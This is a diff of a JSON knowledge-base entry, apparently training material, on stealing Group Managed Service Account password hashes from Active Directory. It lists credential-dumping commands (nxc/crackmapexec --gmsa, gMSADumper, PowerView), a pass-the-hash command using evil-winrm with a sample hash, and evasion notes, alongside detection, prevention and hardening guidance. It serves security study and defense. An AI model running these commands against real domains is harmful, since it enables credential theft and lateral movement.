@@ -24,7 +24,7 @@
     "T1555"
   ],
   "exam": "exam-ok",
-  "notes": "=== WHAT IS GMSA ===\nGroup Managed Service Accounts are AD accounts where Windows automatically manages\nthe password \u2014 rotating it periodically. Intended for services that run on multiple\nhosts (no need to manually sync passwords).\n\nThe password is stored as an NT hash in: msDS-ManagedPassword\nRead access is controlled by: msDS-GroupMSAMembership (which principals can retrieve it)\n\n=== ATTACK CONDITION ===\nIf the account you compromised is listed in msDS-GroupMSAMembership for a gMSA:\n  \u2192 You can retrieve the gMSA's NT hash via LDAP\n  \u2192 Pass-the-hash as the gMSA account\n  \u2192 gMSA accounts often have service-level privileges (DB access, backup rights, etc.)\n  \u2192 Some gMSA accounts are over-privileged (sysadmin on SQL, DA group membership)\n\n=== OUTPUT ===\n  Account: SVC_INT$\n  NTLM hash: 7dfa0531d73101ca080c7379a9bff1c7\n\n=== AFTER GETTING THE HASH ===\nPass-the-hash as the gMSA:\n  evil-winrm -i <target> -u SVC_INT$ -H 7dfa0531d73101ca080c7379a9bff1c7\n  crackmapexec smb <target> -u SVC_INT$ -H <hash>\n\n=== FIND GMSA ACCOUNTS (ENUMERATION) ===\nGet-DomainObject -LDAPFilter '(ObjectClass=msDS-GroupManagedServiceAccount)'\nor:\ncrackmapexec ldap <dc> -u user -p pass --gmsa-convert-id <SID>",
+  "notes": "=== WHAT IS GMSA ===\nGroup Managed Service Accounts are AD accounts where Windows automatically manages\nthe password — rotating it periodically. Intended for services that run on multiple\nhosts (no need to manually sync passwords).\n\nThe password is stored as an NT hash in: msDS-ManagedPassword\nRead access is controlled by: msDS-GroupMSAMembership (which principals can retrieve it)\n\n=== ATTACK CONDITION ===\nIf the account you compromised is listed in msDS-GroupMSAMembership for a gMSA:\n  → You can retrieve the gMSA's NT hash via LDAP\n  → Pass-the-hash as the gMSA account\n  → gMSA accounts often have service-level privileges (DB access, backup rights, etc.)\n  → Some gMSA accounts are over-privileged (sysadmin on SQL, DA group membership)\n\n=== OUTPUT ===\n  Account: SVC_INT$\n  NTLM hash: 7dfa0531d73101ca080c7379a9bff1c7\n\n=== AFTER GETTING THE HASH ===\nPass-the-hash as the gMSA:\n  evil-winrm -i <target> -u SVC_INT$ -H 7dfa0531d73101ca080c7379a9bff1c7\n  crackmapexec smb <target> -u SVC_INT$ -H <hash>\n\n=== FIND GMSA ACCOUNTS (ENUMERATION) ===\nGet-DomainObject -LDAPFilter '(ObjectClass=msDS-GroupManagedServiceAccount)'\nor:\ncrackmapexec ldap <dc> -u user -p pass --gmsa-convert-id <SID>",
   "examples": [
     {
       "label": "Read gMSA password",
@@ -53,21 +53,41 @@
     }
   ],
   "defense": {
-    "why_it_works": "gMSA passwords are stored in the msDS-ManagedPassword LDAP attribute on the service account object in AD. Access to this attribute is controlled by the PrincipalsAllowedToRetrieveManagedPassword property \u2014 only specifically designated principals (computer accounts, groups) can read it. If an attacker controls any principal in that allow-list (via ACL abuse, compromised service account, or group membership), they can query the attribute and receive a blob containing the current NT hash.",
+    "why_it_works": "gMSA passwords are stored in the msDS-ManagedPassword LDAP attribute on the service account object in AD. Access to this attribute is controlled by the PrincipalsAllowedToRetrieveManagedPassword property — only specifically designated principals (computer accounts, groups) can read it. If an attacker controls any principal in that allow-list (via ACL abuse, compromised service account, or group membership), they can query the attribute and receive a blob containing the current NT hash.",
     "prerequisites": "Control of a security principal listed in the gMSA's PrincipalsAllowedToRetrieveManagedPassword. LDAP access to DC (port 389/636). NetExec, DSInternals, or GMSAPasswordReader installed.",
-    "impact": "NT hash of the gMSA account retrieved directly \u2014 enables pass-the-hash to authenticate as the service account. gMSA accounts frequently hold elevated privileges (IIS application pool identity, scheduled task runner, service account with admin rights on specific servers). The NT hash is rotated automatically by AD (every 30 days by default), but is valid until the next rotation.",
-    "detection": "LDAP read of the msDS-ManagedPassword attribute \u2014 Event 4662 on the gMSA computer object if SACL auditing is enabled for this attribute (not configured by default). No default Windows event logs capture this access. Unusual LDAP queries from unexpected hosts against gMSA objects could be detected by SIEM with LDAP audit enabled.",
-    "prevention": "Strictly limit PrincipalsAllowedToRetrieveManagedPassword to only the machine accounts that host the service \u2014 no human accounts, no broad groups. Enable AD object auditing (SACL) on gMSA objects for msDS-ManagedPassword reads (Event 4662). Regularly audit PrincipalsAllowedToRetrieveManagedPassword on all gMSA objects. Monitor for unexpected gMSA account authentication from non-service-host machines.",
-    "evasion": "Single LDAP query \u2014 indistinguishable from normal attribute reads without explicit SACL auditing. No modification to any AD object. Operates silently at the LDAP protocol level.",
+    "impact": "NT hash of the gMSA account retrieved directly — enables pass-the-hash to authenticate as the service account. gMSA accounts frequently hold elevated privileges (IIS application pool identity, scheduled task runner, service account with admin rights on specific servers). The NT hash is rotated automatically by AD (every 30 days by default), but is valid until the next rotation.",
+    "detection": "LDAP read of the msDS-ManagedPassword attribute — Event 4662 on the gMSA computer object if SACL auditing is enabled for this attribute (not configured by default). No default Windows event logs capture this access. Unusual LDAP queries from unexpected hosts against gMSA objects could be detected by SIEM with LDAP audit enabled.",
+    "prevention": "Strictly limit PrincipalsAllowedToRetrieveManagedPassword to only the machine accounts that host the service — no human accounts, no broad groups. Enable AD object auditing (SACL) on gMSA objects for msDS-ManagedPassword reads (Event 4662). Regularly audit PrincipalsAllowedToRetrieveManagedPassword on all gMSA objects. Monitor for unexpected gMSA account authentication from non-service-host machines.",
+    "evasion": "Single LDAP query — indistinguishable from normal attribute reads without explicit SACL auditing. No modification to any AD object. Operates silently at the LDAP protocol level.",
     "sources": [
       "HTB M13",
       "MITRE T1555"
     ],
     "misconfiguration": "Administrative shortcuts create persistent misconfigurations: passwords stored in AD Description/Info attributes (visible to all users), accounts with PasswordNotRequired flag set (blank passwords allowed), LAPS attribute readable by non-admin groups, gMSA readable by unintended principals, or SYSVOL containing scripts with embedded credentials.",
     "vulnerable_config": "# Passwords in AD Description field:\nGet-ADUser -Filter * -Properties Description | Where-Object {$_.Description -ne $null}\n# Returns: svc_backup  Description: 'Temp password: Welcome1!'\n\n# PasswordNotRequired flag (UAC 0x20 = PASSWD_NOTREQD):\nGet-ADUser -Filter {PasswordNotRequired -eq $true}\n\n# LAPS password readable by Domain Users (misconfigured ACL):\nGet-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select-Object Name,'ms-Mcs-AdmPwd'\n# Should only be readable by admins + specific LAPS readers group",
-    "secure_config": "# Remove passwords from Description/Info fields:\nGet-ADUser -Filter * -Properties Description,Info |\n    Where-Object {$_.Description -match 'pass|pwd|temp|welcome'} |\n    Set-ADUser -Description $null\n\n# Fix PasswordNotRequired accounts:\nGet-ADUser -Filter {PasswordNotRequired -eq $true} |\n    Set-ADAccountControl -PasswordNotRequired $false\n\n# LAPS ACL hardening \u2014 restrict ms-Mcs-AdmPwd reads:\n# Only specific LAPS-Readers security group should have Read on this attribute\n# Run: Set-AdmPwdComputerSelfPermission, Set-AdmPwdReadPasswordPermission\n\n# Audit gMSA readers:\nGet-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword |\n    Select-Object Name, PrincipalsAllowedToRetrieveManagedPassword"
+    "secure_config": "# Remove passwords from Description/Info fields:\nGet-ADUser -Filter * -Properties Description,Info |\n    Where-Object {$_.Description -match 'pass|pwd|temp|welcome'} |\n    Set-ADUser -Description $null\n\n# Fix PasswordNotRequired accounts:\nGet-ADUser -Filter {PasswordNotRequired -eq $true} |\n    Set-ADAccountControl -PasswordNotRequired $false\n\n# LAPS ACL hardening — restrict ms-Mcs-AdmPwd reads:\n# Only specific LAPS-Readers security group should have Read on this attribute\n# Run: Set-AdmPwdComputerSelfPermission, Set-AdmPwdReadPasswordPermission\n\n# Audit gMSA readers:\nGet-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword |\n    Select-Object Name, PrincipalsAllowedToRetrieveManagedPassword"
   },
   "tools": [
     "netexec"
+  ],
+  "variations": [
+    {
+      "label": "gMSADumper (Python)",
+      "command": "python3 gMSADumper.py -u <user> -p <password> -d <domain>"
+    },
+    {
+      "label": "PowerView (on-host)",
+      "command": "Get-DomainObject -Identity <gmsa_account> -Properties msds-managedpassword"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Find gMSAs you can read the password of",
+      "command": "nxc ldap <dc_ip> -u <user> -p <password> --gmsa"
+    },
+    {
+      "label": "Use the NT hash for the gMSA account",
+      "command": "# pass-the-hash / overpass-the-hash as the gMSA (often high-priv)"
+    }
   ]
 }
